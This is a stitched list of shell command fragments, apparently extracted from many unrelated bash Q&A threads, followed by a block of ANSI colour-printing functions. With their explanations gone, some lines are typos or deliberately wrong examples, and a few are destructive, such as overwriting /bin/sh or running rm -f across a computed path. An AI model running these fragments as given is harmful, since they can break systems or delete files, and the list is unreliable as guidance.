ps -aef
sudo apt-get install libproc-processtable-perl
perl process.pl
stat -t /proc/<pid> | awk '{print $14}'
date +%s
killall -i
pgrep -f
/usr/bin/python2 offlineimap
notify-send "My name is bash and I rock da house"
pwd -P
char *getcwd(char *buf, size_t size)
readlink -f
perl -MCwd -le 'print Cwd::abs_path(shift)' "$path"
realpath foo
readlink -e
readlink -f
npm install rreadlink -g
shopt -s expand_aliases
[[ $OSTYPE != darwin* ]]
man core
limit coredumpsize unlimited
kill -s SEGV <PID>
sysctl -p
sleep 10 &
killall -SIGSEGV sleep
ulimit -a
gedit ~/.bashrc
ulimit -c unlimited
-O0  -g
ulimit -c
ulimit -c
Markdown All In One: Print documents to HTML (select a source folder)
Preferences: Open Settings (JSON)
rm `...`
(cd /path/to && ls -tp | grep -v '/$' | tail -n +6 | xargs -I {} rm -- {})
-d '\n'
ls -tp
ls -tp
(cd /path/to && ls -tp ...)
grep -v '/$'
tail -n +6
tail -n +
xargs -I {} rm -- {}
xargs -I {} rm -- {}
keep NUM DIR
ls -td *.tar
awk 'NR>7...
print "rm \"" $0 "\""
ls -t
touch 'foo " bar'
touch 'hello * world'
ls -b
find -printf
time filename
ls -tr /path/foo/ | head -n -5 | xargs -I% --no-run-if-empty rm /path/foo/%
cp --enableAwesomeness template_*.txt foo_*.txt
export LANG=en_NZ
en_NZ ISO-8859-1
chmod +x backup.sh
backup.sh [username (for rsync)] [backup source device] [backup source location] [backup target device] [backup target location]
C-x C-r
ls abcxyz
>/dev/null 2>/dev/null
>/dev/null 2>&1
sh -c '( ( command ) & )'
tmux new -d <shell cmd>
tmux attach
program-to-execute &!
ssh user@host 'background command &>/dev/null &'
ssh -t user@host 'bash -c "interactive command; nohup backgroud command &>/dev/null &"'
background command
background command
background command
ssh -t user@host 'bash -c "interactive command; nohup backgroud command &>/dev/null & sleep 1"'
OpenSSH_8.6p1, OpenSSL 1.1.1g FIPS  21 Apr 2020
2> a_file
exec 2> /tmp/myfile
ssh -t
make -jX
man wait
jobs -p
kill -0
kill -0
kill -0
echo $DOMAINS |wc -w
tail -c 1
-s "$1"
-z "$(tail -c 1 "$1")"
echo $file
echo whereis gpg
echo $PATH
which gpg
/usr/bin/gpg ...  2>&1 >> gpg.log
--homedir /root/.gnupg
ls | tee directory.txt
find ./ -type f
-type f
-type f
man ls
ls -U --color=never
\ls -U
ls -1
ls -1 -f
ls -f
ls -U
ls --color=auto
echo ./*
find . -type f -maxdepth 1 | sort | tail -n 1
ls -alh
n > 0
P(i+1 mod n)
0 <= i < n
prog1 | prog2
{ prog1 | prog2 } >&0
{ ... } >/dev/fd/0
{ ... }
ls -f | head -10
ls > ~/lots-of-files.txt
ls | xargs -I thefilename mv thefilename ~/some/other/directory
ls | head -10000 | xargs -I x mv x /first/ten/thousand/files/go/here
ls | head
df -i
ls -U
ls -f
ls -U
ls -f
find . -name * -exec somcommands {} \;
find . -name * > ls.txt
find . -name * -exec ls -l {} \; > ls.txt
vim ./my_program.c
alias -s c=vim
print *(e:age today now:)
zmv '(*).mp3' '$1.wma'
man test
for i in $(ls ...)
for i in $1/resources*; do ...
[ $i != file1 -a $1 != file2 ]
seq 1 10
bash$ IFS=-. read system source date ext <<< foo-bar-yyyymmdd.dat
photo_$(basename $f .${f#*.})_%04d.${f#*.}
ls *.jpg | ...
for f in * ; do ;done
echo $f | sed
sed 's/[^0-9]*//g'
number = …
printf "%04d" $number
`echo ... $2}\`
"$(command substitution)"
"My M0viez"
ls -l
( ... )
${1:?pathname expected}
( ... )
1: parameter not set
mkdir -p
test -d
man test
-d file
man [
help [
help test
man test
man [
mkdir tempdir
file $directory_name
file blah
cannot open 'blah' (No such file or directory)
file bluh
bluh: directory
dirname "$0"
dirname $0
bash -c
update_terminal_cwd >&2
>/dev/null 2>&1
bash script
bash -c script
source script
. script
echo X
info coreutils
source test1/test2/test_script.sh
bash test1/test2/test_script.sh
/bin/sh [script path relative to path component]
source <(echo 'echo $0')
readlink -f
greadlink -f
bash -c <script>
print -P %x
print -P %x
sudo apt update && sudo apt install coreutils
. ~/.bashrc
. ~/.bash_aliases
. get_script_path.sh
source get_script_path.sh
realpath -s
man bash
echo $(realpath $_)
echo $(realpath $(dirname $0))
echo $(realpath $BASH_SOURCE)
$(realpath $BASH_SOURCE)
mkdir $'\n'
readlink -f
readlink -f
readlink -f
cd -
echo 123 | tee >(tr 1 a) | tr 1 b
2> >(...)
bash v4.4+
wait $!
| cat
ksh 93u+
2> >(...)
| cat
2> >(...)
man parallel
parallel --version
| tee >(proc2) >(proc3) >/dev/null
sh -c '<shell command>'
x00 x01 x02...
set -e
shopt -s extdebug
set -e
set -eu
export -f error_exit
set -e
set -e
set -e
local x=y
set -e
trap ERR
set -o
,set -o pipefail
set -o errtrace
set -e
set -e
exec 1>/dev/null
exec 2>/dev/null
if else
stty stop ""
cd /media/
"\M-p": history-search-backward
> make <ESC p>
> make some_really_painfully_long_target
ls filea fileb
vi !$
vimdiff !*
ls <up-arrow>
cp /home/foo/realllylongname.cpp{,-old}
cp /home/foo/realllylongname.cpp /home/foo/realllylongname.cpp-old
shopt -s cdable_vars
cd Dcentmain
ls -thor
mv file $OLDPWD
ping blah.really.long.domain.name.foo.com
(cd /path/to/source/dir/ ; tar cf - * ) | (cd /path/to/destination/ ; tar xf - )
mv file-with-long-name-typed-with-tab-completion.txt old-!#^
diff file1.txt file2.txt
for i in $(ls)
pwd | pbcopy
alias ..='cd ..'
make -j [NUM_JOBS]
$ touch myself
cd 1
echo !$ !-2^ *
echo aword someotherword *
echo !$ !-2^ *
echo !$ !-2^ LOG Makefile bar.c foo.h
sort -n
ls | sed -n '1~4 p' | xargs -i mv {} ../destdir/
find . -not -type d -exec file "{}" ";" | grep CRLF
shopt -s globstar
shopt -s lithist
cd old new
cd one two
cd ../../../../../two/bar/bar/foo/bar
sudo /path/to/gemmove foo
<(hg cat file)
CREATE USER OPS$SCOTT IDENTIFIED BY EXTERNALLY
openssl rsautl -decrypt -inkey ~/.ssh/id_rsa -in ~/.ssh/secret.dat
man gln
brew list coreutils
set +bm
exec 2> /dev/null
sh -c 'cmd &'
jobs 2>&1 >/dev/null
sudo ls.sh
sudo -s
sudo tee
tee -a
tee --append
sudo su
tee --append
tee -a
tee -a
> /dev/null
sudoe 'deb blah # blah' /etc/apt/sources.list
cat >>
[[ $(type -t foo) == function ]] && echo "Foo exists"
declare -F f
set -e
|| return
|| { true; return; }
|| return;
set -e
head -1
cmd1 | cmd2 | cmd3
${PIPESTATUS: -1}
test -e
ls - A
shopt -s nullglob dotglob; f=your/dir/*; ((${#f}))
[ -n "$(ls -A your/dir)" ]
"No such file or directory"
[ -n "$(find your/dir -prune -empty)" ]
-maxdepth 0
-type d
find -prune
find -maxdepth 0
find -empty
find -type d
[ -n "$(find your/dir -prune -empty)" ]
busybox sh
unsetopt nomatch
find -> dd
man test
man zshexpn
ls /some/dir | grep xml | wc -l  | grep -w "0"
[[ -s somedir ]]
[ -s somedir ]
echo *
echo .[^.]*
echo "empty dir"
read –n1
read -n1
echo "testhost"
{ echo "testhost"; cat; }
BAR * BAR
echo BAR * BAR
set -f
$ shopt -s direxpand
for %%a in (%p%) do set p=%%~a
getconf LONG_BIT
getconf LONG_BIT
file /bin/cp
cat fileName | grep -v ^$ | wc -l
wc -l
dircmp dir1 dir2
diff -q
man rsync
tail -1 > file.txt
xclip -i -selection clipboard
xsel -i -p
basename "$x" .ext
basename string [suffix]
readarray -d
touch -r
cut -c
sort -u
grep -q
return 0
grep -c 99999
svn diff
sudo vi /etc/launchd.conf
launchctl setenv
export PATH=/opt/local/bin:/opt/local/sbin:$PATH
launchctl config user path /bin:/usr/bin:/mystuff
man launchctl
man launchctl
Show package contents
sudo nano /etc/paths
sudo vim /etc/paths
echo $PATH
launchctl getenv myVar
launchctl load ...
<$HOME>/Library/LaunchAgents/osx-env-sync.plist: Operation already in progress
launchctl config
launchctl setenv PATH <new path>
source ./bimbom.ev
echo $GOPATH
echo $PATH
launchctl config user varName varVal
sort temp.txt -o temp.txt
sort -o F F
cat F | sort -o F
cat F | sort -m -o F - G
sort file -o file
command file
<(command file)
find dir -type f -exec sed -i 's/ *$//' '{}' ';'
-not -iwholename '.git'
-not -iwholename '*.git*'
-iname "*.py" -or -iname "*.php"
-type f
git grep
shopt -s globstar
-i ''
ls -1
for i in $(ls | grep -i ...)
for i in $(find . -type f -iname 'SomeString*' -print -maxdepth 1)...
find ... -exec do_stuff {} \; ...
tail -f
tail -f
-ctime +30
-ctime -30
-ctime 30
! -newerXY
exec('ps aux')
killall <name>
ps aux
kill %1
enable -n kill
ln -f /bin/bash /bin/sh
some command
Compound Commands
gzip -cd "$X" | xz -9c > "${X%.gz}.xz"
for i in x; do ((a; b; c;)&); done
for i in 500 300 100; do ((printf "Start $i: "; date; dd if=/dev/zero of=testfile_$i bs=1m count=$i 2>/dev/null; printf "End $i: "; date;)&) && sleep 1; done
M-x term
C-x o
C-c C-j
C-c C-k
u'\N{pound sign}'
execute pound = u'\N{pound sign}'
for i in $(seq 1 $END); do echo $i; done
echo $((i++))
for ((expr;expr;expr))
for ((expr1;expr2;expr3));
for (expr1;expr2;expr3)
for i in <list>; do
(( ))
(( ))
for ((;;))
let i=i+1
bash --posix
seq 1 $END | xargs -I {} echo {}
echo {1..10}
for i in {1..a}; do echo $i; done
$( )
for (( ; ; ))
$(( ))
for (( i=1; i<=1000000; i++ ))
for i in $(seq 1 1000000)
man seq
seq first incr last
for ((i=1;i<=END;i++))
a=1; b=5; d='for i in {'$a'..'$b'}; do echo -n "$i"; done;' echo "$d" | bash
perl -c 'script name'
ech hello
echo hello
echo $?
find . -name '*.sh' -print0 | xargs -0 -P"$(nproc)"  -I{} bash -n "{}"
at [time] 2>/dev/null
at [time] 2>&1 | grep -v warning
kill -0
kill -9
set -C
set -e
GNU Parallel
GNU Parallel
exec 3<>/file && exec 4</file
man flock
>foo 2>&1
program >> alloutput.log 2>&1
sed -e '1,N d; M q'
grep -C
sed -n '2p' file.txt
sed -n '2,5p' file.txt
sed -n '2,$p' file.txt
sed -n '2,4p;6,8p' file.txt
$ man ack
 myscript.sh -p=my_prefix -s=dirname -l=libname
`sed 's/[^=]*=//' <<< "$i"`
`echo "$i" | sed 's/[^=]*=//'`
--option argument
`sed 's/[^=]*=//' <<< "$i"`
`echo "$i" | sed 's/[^=]*=//'`
-vf filename
help getopts
myscript.sh -f ./serverlist.txt
script.sh -o outFile file1 file2 -v
script.sh --outfile=fileOut --infile fileIn
getopt --test
sudo port install getopt
--flag value
-n arg
tar -xzf foo.tar.gz
tar -x -z -f foo.tar.gz
tar xzf bar.tar.gz
tar xfz bar.tar.gz
abc X Y Z
-abc X Y Z
-cba Z Y X
cba Z Y X
-cb-aaa-0-args Z Y X
-c-bbb-1-args Z Y X -a
--ccc-2-args Z Y -ba X
c Z Y b X a
-c Z Y -b X -a
--ccc-2-args Z Y --bbb-1-args X --aaa-0-args
Bourne Shell
getopts "f:(file)(input-file)o:(output-file)" OPTX "$@"
-d 1
eval $(parse_params "$@")
./myscript -flag flagvariable -otherflag flagvar2
-q -w -e
--q=qwe ty
qwe ty
-o a -op attr ibute --option=att ribu te --op-tion attribute --option att-ribute
--longopt val
-x -y -z
eval "local key='val'"
-n [arg]
-abn [arg]
--name [arg]
-p VALUE
--param VALUE
dirname $0
script_root=$(dirname $(readlink -f $0))
man hier
"$(basename "$0")"
"$(basename \"$0\")"
$(basename $0)
source self.sh
source ~/self.sh
alias find="find ."
alias find=find
cp file1 file2
branch myfile dir1 dir2 dir3
ls -db di*/subdir | xargs -n 1 cp File
tee <inputfile file2 file3 file4 ... >/dev/null
cp file1 /foo/; cp file1 /bar/; cp file1 /foo2/; cp file1 /bar2/
cp -r dir1/ /foo/; cp -r dir1/ /bar/; cp -r dir1/ /foo2/; cp -r dir1/ /bar2/
hd* and sd*
ls /sys/block
file -s <device>
fdisk -l
fdisk -l
man bash
mv original.filename new.original.filename
mv -p=new. original.filename
mv original.filename new.~
man mv
info mv
for filename in *.wav; do mv $filename ${filename%.*}_en.wav; done;
find . -type f -exec bash -c 'echo prefix_${0#./}' {} \;
find . -type f -exec bash -c 'echo mv $0 new.${0#./}' {} \;
find . -type f -exec bash -c 'echo ${0%.*}_suffix.${0##*.}' {} \;
mv $0
find . -type f -exec bash -c 'mv $0 1.${0#./}' {} \;
(a | b; c ) | something >result
pip install ez
files = fls('.','py$'); cp(files, myDir)
git log --pretty=oneline --grep='Create'
disown -h <pid>
echo $!
SECONDS=0; sleep 5 ; echo "that took approximately $SECONDS seconds"
a 1
rm -r source/d*.c
rm -r source/delete_me.c source/do_not_delete_me.c
ls $HOME/tmp
ls -N --color=tty -T 0 /home/cramey
export TMOUT=$((15*60))
set -o vi
grep -ri myText .
man bash
$(cat file)
$(< file)
-d ''
var="$(command ...)"
-read d ''
cat file
grep <pattern> file
shopt -s extglob
shopt -u extglob
man bash
shopt -s extglob
unset GLOBIGNORE
rm *techno*
ls *Music*
substr "abcdefg" 2 3
$(command substitution)
man bash
grep $(find . -name "*,txt")
find -print0
xargs -0
while true
read -r yn </dev/tty
if ... then ... else
yes | ja | si | oui
yes - no
xargs -p
parallel --interactive
[[ -t 0 ]] && read ...
read -n 1
$'\e[1;32m ... \e[0m '
[[ $do_xxxx =~ ^(y|Y|)$ ]]
bash --dump-po-strings scriptname
Hit any key to continue
set -o nounset
unbound variable
set -o nounset
set +u
set -u
set -o nounset
(set -u)
parameter null or not set
set -o nounset
grep -q
stringinstring "$string1" "$string2"
[ stringvalue ]
[  ]
tcsh setenv
export VAR=value
export VAR='my val'
export VAR="$MY_OTHER_VAR"
export VAR
export VAR=value
exec bash
echo -ne
gzip --list
dd if="$input_drive_path" of="$output_file_path"
dd if="$input_drive_path" | pv | dd of="$output_file_path"
Wait "34 min" "warm up the oven"
Wait "dec 31" "happy new year"
'\r' + $some_sort_of_progress_msg
7z a -r newZipFile myFolder
tqdm -h
echo -n
echo -e
stat -c
gzip -l
tail -n1
tr -s ' '
cut -d' ' -f3
printf %50s
tr  ' '  '#'
man bash
man bash
echo -ne "\r${BAR:0:$i}"
Bad substitution
echo -ne "\r$(expr "x$name" : "x.\{0,$num_skip\}\(.\{0,$num_keep\}\)")"
progreSh 40
current length / total size
exit 0
read -t <float seconds> && break
printf -v
▏ ▎ ▍ ▌ ▋ ▊ ▉ █
string width
graphic width
25 ms
exec {sha1in}<
<( ... )
sha1sum -b - <"$1"
while ! read -ru $sha1in -t .025 sha1res _
25 ms
man expect
ssh tomcatuser@server perl -e 'do-everything-on-one-line;'
scp the_package.tbz tomcatuser@server:the_place/.
ssh tomcatuser@server /bin/sh <<\EOF
tar xj the_package.tbz
rsync rsync://repository/the_package_place
mv $TOMCAT_WEBAPPS/old_war $TOMCAT_WEBAPPS/old_war.old
mv $THE_PLACE/new_war $TOMCAT_WEBAPPS/new_war
touch $TOMCAT_WEBAPPS/new_war
mv $THE_PLACE/vhost_file $APACHE_VHOST_DIR/vhost_file
$APACHECTL restart
for box in box1_name box2_name box3_name
fab reload
sudo /etc/init.d/apache2 reload
unhash -f z
unset -f z
svn ls
-newer file
touch -t
find $PATH -name $log_prefix"*"$log_ext -mmin +$num_mins -exec rm -f {} \;
date +%Y%m%d%H%M%S -d  "6 hours ago"
killall afplay
trap 'killall afplay' EXIT
cd my-project
cd dir
. <your file name>
./<your file name>
exec bash
sudo kwrite /home/user/.bashrc /home/user/.bash_profile /root/.bashrc  /root/.bash_profile
cd ..
$(cmd ...)
arg with space
help for
for NAME [in WORDS ... ;] do COMMANDS; done
'in WORDS ...;'
'in "$@"'
echo $SRC
echo "$SRC"
RETURN: "\C-e\C-v\n\C-v\n\n"
C-x C-r
python -c "import os,sys; print(os.path.abspath(sys.argv[1]))" path/to/file
python -c "import os,sys; print(os.path.realpath(sys.argv[1]))" path/to/file
pwd -P
stat -f %N ~/Documents
stat -f %Y example_symlink
readlink -f
readlink -f
realpath -sm
realpath -sm
realpath -sm
ps -elW
curl --data-urlencode
man curl
curl -V
gsub("\r?\n", "\r\n")
--slurp --raw-input
read -n 1
[[ =~ ]]
printf '%%%02X'
test.sh "Cherry Hill" "New York City"
find -exec
set -f
for item in /path/*
mount --bind bravo alpha
printf "%s\n"
#!/bin/sh -u
sed -i 's/php3/php/g' *
find . -type f
man date
date +%s
FPAT = "([^,]*)|(\"[^\"]+\")"
perl -MText::CSV_XS -ne 'BEGIN{$csv=Text::CSV_XS->new()} if($csv->parse($_)){@f=$csv->fields();for $n (0..$#f) {print "field #$n: $f[$n]\n"};print "---\n"}' file.csv
sudo apt-get install cpanminus
sudo cpanm Text::CSV_XS
if [ $? -eq 0 ]
cp --archive
tar cf - * | (cd <dest> && tar xvBf - )
find . -type f -execdir cat {} \; | wc -l
-name "*.c"
xargs -null
! -a
if [[ -e ${resin_dir} ]]
file exists
[ ! -a /path ] && echo exists
negate -a ..
if '!' and '/path' is true
"! -a"
! -a ${resin_dir}
var="  This is a test  "
for FILE in $@
for FILE in "$@"
"$1" "$2" ...
$1 $2 ...
/bin/ls hi1.txt hi1.txt hi1.txt
help trap
ssh -n -x root@db-host 'killall mysqldump'
shopt -s huponexit; your_command
ssh -t
history -a
history -w
history -a
history -a
history -w
sed -i -e "1d" $FILE
-n x
tail -n 5
tail -n +1
tail -n +2
-n +2
line=$(head -n1 list.txt && echo "$(tail -n +2 list.txt)" > list.txt)
stty -a
## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ [ Aesthir's Color Functions ] ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
Normal () { printf '\e[m'"$*"; }                  ; Tblack () { printf '\e[0;30m'"$*"'\e[m'; }
TNormal () { printf '\e[m'"$*"; }                 ; Tred () { printf '\e[0;31m'"$*"'\e[m'; }
Bold () { printf '\e[1m'"$*"'\e[m'; }             ; Tgreen () { printf '\e[0;32m'"$*"'\e[m'; }
TBold () { printf '\e[1m'"$*"'\e[m'; }            ; Tbrown () { printf '\e[0;33m'"$*"'\e[m'; }
Underline () { printf '\e[4m'"$*"'\e[m'; }        ; Tyellow () { printf '\e[0;33m'"$*"'\e[m'; }
TUnderline () { printf '\e[4m'"$*"'\e[m'; }       ; Tblue () { printf '\e[0;34m'"$*"'\e[m'; }
Flash () { printf '\e[5m'"$*"'\e[m'; }            ; Tmagenta () { printf '\e[0;35m'"$*"'\e[m'; }
TFlash () { printf '\e[5m'"$*"'\e[m'; }           ; Tpurple () { printf '\e[0;35m'"$*"'\e[m'; }
Invert () { printf '\e[7m'"$*"'\e[m'; }           ; Taqua () { printf '\e[0;36m'"$*"'\e[m'; }
TInvert () { printf '\e[7m'"$*"'\e[m'; }          ; Tcyan () { printf '\e[0;36m'"$*"'\e[m'; }
Invisible () { printf '\e[8m'"$*"'\e[m'; }        ; Tgrey () { printf '\e[0;37m'"$*"'\e[m'; }
TInvisible () { printf '\e[8m'"$*"'\e[m'; }       ; Twhite () { printf '\e[0;37m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ Bold Color Text ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ## ∞∞∞∞∞∞∞∞∞∞∞∞ Underlined Color Text ∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
TblackB () { printf '\e[1;30m'"$*"'\e[m'; }       ; TblackU () { printf '\e[4;30m'"$*"'\e[m'; }
TgreyB () { printf '\e[1;30m'"$*"'\e[m'; }        ; TredU () { printf '\e[4;31m'"$*"'\e[m'; }
TredB () { printf '\e[1;31m'"$*"'\e[m'; }         ; TgreenU () { printf '\e[4;32m'"$*"'\e[m'; }
TgreenB () { printf '\e[1;32m'"$*"'\e[m'; }       ; TbrownU () { printf '\e[4;33m'"$*"'\e[m'; }
TbrownB () { printf '\e[1;33m'"$*"'\e[m'; }       ; TyellowU () { printf '\e[4;33m'"$*"'\e[m'; }
TyellowB () { printf '\e[1;33m'"$*"'\e[m'; }      ; TblueU () { printf '\e[4;34m'"$*"'\e[m'; }
TblueB () { printf '\e[1;34m'"$*"'\e[m'; }        ; TmagentaU () { printf '\e[4;35m'"$*"'\e[m'; }
TmagentaB () { printf '\e[1;35m'"$*"'\e[m'; }     ; TpurpleU () { printf '\e[4;35m'"$*"'\e[m'; }
TpurpleB () { printf '\e[1;35m'"$*"'\e[m'; }      ; TaquaU () { printf '\e[4;36m'"$*"'\e[m'; }
TaquaB () { printf '\e[1;36m'"$*"'\e[m'; }        ; TcyanU () { printf '\e[4;36m'"$*"'\e[m'; }
TcyanB () { printf '\e[1;36m'"$*"'\e[m'; }        ; TgreyU () { printf '\e[4;37m'"$*"'\e[m'; }
TwhiteB () { printf '\e[1;37m'"$*"'\e[m'; }       ; TwhiteU () { printf '\e[4;37m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞∞∞∞∞∞∞ Flashing Color Text ∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ## ∞∞∞∞∞∞∞∞∞∞∞∞∞ Inverted Color Text ∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
TblackF () { printf '\e[5;30m'"$*"'\e[m'; }       ; TblackI () { printf '\e[7;40m'"$*"'\e[m'; }
TredF () { printf '\e[5;31m'"$*"'\e[m'; }         ; TredI () { printf '\e[7;41m'"$*"'\e[m'; }
TgreenF () { printf '\e[5;32m'"$*"'\e[m'; }       ; TgreenI () { printf '\e[7;42m'"$*"'\e[m'; }
TbrownF () { printf '\e[5;33m'"$*"'\e[m'; }       ; TbrownI () { printf '\e[7;43m'"$*"'\e[m'; }
TyellowF () { printf '\e[5;33m'"$*"'\e[m'; }      ; TyellowI () { printf '\e[7;43m'"$*"'\e[m'; }
TblueF () { printf '\e[5;34m'"$*"'\e[m'; }        ; TblueI () { printf '\e[7;44m'"$*"'\e[m'; }
TmagentaF () { printf '\e[5;35m'"$*"'\e[m'; }     ; TmagentaI () { printf '\e[7;45m'"$*"'\e[m'; }
TpurpleF () { printf '\e[5;35m'"$*"'\e[m'; }      ; TpurpleI () { printf '\e[7;45m'"$*"'\e[m'; }
TaquaF () { printf '\e[5;36m'"$*"'\e[m'; }        ; TaquaI () { printf '\e[7;46m'"$*"'\e[m'; }
TcyanF () { printf '\e[5;36m'"$*"'\e[m'; }        ; TcyanI () { printf '\e[7;46m'"$*"'\e[m'; }
TgreyF () { printf '\e[5;37m'"$*"'\e[m'; }        ; TgreyI () { printf '\e[7;47m'"$*"'\e[m'; }
TwhiteF () { printf '\e[5;37m'"$*"'\e[m'; }       ; TwhiteI () { printf '\e[7;47m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞∞∞∞∞∞∞ Invisible Color Text ∞∞∞∞∞∞∞∞∞∞∞∞∞ ## ∞∞∞∞∞∞∞∞ Plain Text on Color Background ∞∞∞∞∞∞∞∞ ##
TblackV () { printf '\e[8;30m'"$*"'\e[m'; }       ; Bblack () { printf '\e[m'"$*"'\e[m'; }
TredV () { printf '\e[8;31m'"$*"'\e[m'; }         ; Bred () { printf '\e[0;41m'"$*"'\e[m'; }
TgreenV () { printf '\e[8;32m'"$*"'\e[m'; }       ; Bgreen () { printf '\e[0;42m'"$*"'\e[m'; }
TbrownV () { printf '\e[8;33m'"$*"'\e[m'; }       ; Bbrown () { printf '\e[0;43m'"$*"'\e[m'; }
TyellowV () { printf '\e[8;33m'"$*"'\e[m'; }      ; Byellow () { printf '\e[0;43m'"$*"'\e[m'; }
TblueV () { printf '\e[8;34m'"$*"'\e[m'; }        ; Bblue () { printf '\e[0;44m'"$*"'\e[m'; }
TmagentaV () { printf '\e[8;35m'"$*"'\e[m'; }     ; Bmagenta () { printf '\e[0;45m'"$*"'\e[m'; }
TpurpleV () { printf '\e[8;35m'"$*"'\e[m'; }      ; Bpurple () { printf '\e[0;45m'"$*"'\e[m'; }
TaquaV () { printf '\e[8;36m'"$*"'\e[m'; }        ; Baqua () { printf '\e[0;46m'"$*"'\e[m'; }
TcyanV () { printf '\e[8;36m'"$*"'\e[m'; }        ; Bcyan () { printf '\e[0;46m'"$*"'\e[m'; }
TgreyV () { printf '\e[8;37m'"$*"'\e[m'; }        ; Bgrey () { printf '\e[0;47m'"$*"'\e[m'; }
TwhiteV () { printf '\e[8;37m'"$*"'\e[m'; }       ; Bwhite () { printf '\e[0;47m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞∞∞ Bold Text on Color Background ∞∞∞∞∞∞∞∞ ## ∞∞∞∞∞∞ Underlined Text on Color Background ∞∞∞∞∞ ##
BblackB () { printf '\e[1;40m'"$*"'\e[m'; }       ; BblackU () { printf '\e[4;40m'"$*"'\e[m'; }
BredB () { printf '\e[1;41m'"$*"'\e[m'; }         ; BredU () { printf '\e[4;41m'"$*"'\e[m'; }
BgreenB () { printf '\e[1;42m'"$*"'\e[m'; }       ; BgreenU () { printf '\e[4;42m'"$*"'\e[m'; }
BbrownB () { printf '\e[1;43m'"$*"'\e[m'; }       ; BbrownU () { printf '\e[4;43m'"$*"'\e[m'; }
ByellowB () { printf '\e[1;43m'"$*"'\e[m'; }      ; ByellowU () { printf '\e[4;43m'"$*"'\e[m'; }
BblueB () { printf '\e[1;44m'"$*"'\e[m'; }        ; BblueU () { printf '\e[4;44m'"$*"'\e[m'; }
BmagentaB () { printf '\e[1;45m'"$*"'\e[m'; }     ; BmagentaU () { printf '\e[4;45m'"$*"'\e[m'; }
BpurpleB () { printf '\e[1;45m'"$*"'\e[m'; }      ; BpurpleU () { printf '\e[4;45m'"$*"'\e[m'; }
BaquaB () { printf '\e[1;46m'"$*"'\e[m'; }        ; BaquaU () { printf '\e[4;46m'"$*"'\e[m'; }
BcyanB () { printf '\e[1;46m'"$*"'\e[m'; }        ; BcyanU () { printf '\e[4;46m'"$*"'\e[m'; }
BgreyB () { printf '\e[1;47m'"$*"'\e[m'; }        ; BgreyU () { printf '\e[4;47m'"$*"'\e[m'; }
BwhiteB () { printf '\e[1;47m'"$*"'\e[m'; }       ; BwhiteU () { printf '\e[4;47m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞ Flashing Text on Color Background ∞∞∞∞∞∞ ## ∞∞∞∞∞∞∞ Inverted Text on Color Background ∞∞∞∞∞∞ ##
BblackF () { printf '\e[5;40m'"$*"'\e[m'; }       ; BblackI () { printf '\e[7;30m'"$*"'\e[m'; }
BredF () { printf '\e[5;41m'"$*"'\e[m'; }         ; BredI () { printf '\e[7;31m'"$*"'\e[m'; }
BgreenF () { printf '\e[5;42m'"$*"'\e[m'; }       ; BgreenI () { printf '\e[7;32m'"$*"'\e[m'; }
BbrownF () { printf '\e[5;43m'"$*"'\e[m'; }       ; BbrownI () { printf '\e[7;33m'"$*"'\e[m'; }
ByellowF () { printf '\e[5;43m'"$*"'\e[m'; }      ; ByellowI () { printf '\e[7;33m'"$*"'\e[m'; }
BblueF () { printf '\e[5;44m'"$*"'\e[m'; }        ; BblueI () { printf '\e[7;34m'"$*"'\e[m'; }
BmagentaF () { printf '\e[5;45m'"$*"'\e[m'; }     ; BmagentaI () { printf '\e[7;35m'"$*"'\e[m'; }
BpurpleF () { printf '\e[5;45m'"$*"'\e[m'; }      ; BpurpleI () { printf '\e[7;35m'"$*"'\e[m'; }
BaquaF () { printf '\e[5;46m'"$*"'\e[m'; }        ; BaquaI () { printf '\e[7;36m'"$*"'\e[m'; }
BcyanF () { printf '\e[5;46m'"$*"'\e[m'; }        ; BcyanI () { printf '\e[7;36m'"$*"'\e[m'; }
BgreyF () { printf '\e[5;47m'"$*"'\e[m'; }        ; BgreyI () { printf '\e[7;37m'"$*"'\e[m'; }
BwhiteF () { printf '\e[5;47m'"$*"'\e[m'; }       ; BwhiteI () { printf '\e[7;37m'"$*"'\e[m'; }
## ∞∞∞∞∞∞ Invisible Text on Color Background ∞∞∞∞∞∞ ## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ Color Code Notes ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
BblackV () { printf '\e[8;40m'"$*"'\e[m'; }     ## Unless I missed something or made a mistake, I   ##
BredV () { printf '\e[8;41m'"$*"'\e[m'; }       ## calculate a total of 7681 different color codes, ##
BgreenV () { printf '\e[8;42m'"$*"'\e[m'; }     ## none of which produce a duplicate result.        ##
BbrownV () { printf '\e[8;43m'"$*"'\e[m'; }     ##                      These will be fine for now. ##
ByellowV () { printf '\e[8;43m'"$*"'\e[m'; }
BblueV () { printf '\e[8;44m'"$*"'\e[m'; }
BmagentaV () { printf '\e[8;45m'"$*"'\e[m'; }
BpurpleV () { printf '\e[8;45m'"$*"'\e[m'; }
BaquaV () { printf '\e[8;46m'"$*"'\e[m'; }
BcyanV () { printf '\e[8;46m'"$*"'\e[m'; }
